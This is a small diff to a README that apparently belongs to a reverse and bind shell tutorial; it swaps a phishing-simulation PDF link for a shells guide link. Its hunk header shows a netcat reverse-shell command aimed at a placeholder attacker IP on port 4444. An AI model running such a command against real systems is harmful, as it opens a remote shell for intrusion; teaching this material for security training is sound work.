@@ -43,7 +43,7 @@ nc <attacker_ip> 4444 -e /bin/bash
 
 ## Additional Documentation
 
-For a more detailed walkthrough, [view the full PDF guide](https://github.com/khajaazhar/phishing-simulation-gophish/raw/main/Gophish_Simulation_Documentation.pdf).
+For a more detailed walkthrough, [view the full PDF guide](https://github.com/khajaazhar/Reverse-Bind-shell/blob/main/Shells.pdf).
 
 ---
 ## Disclaimer
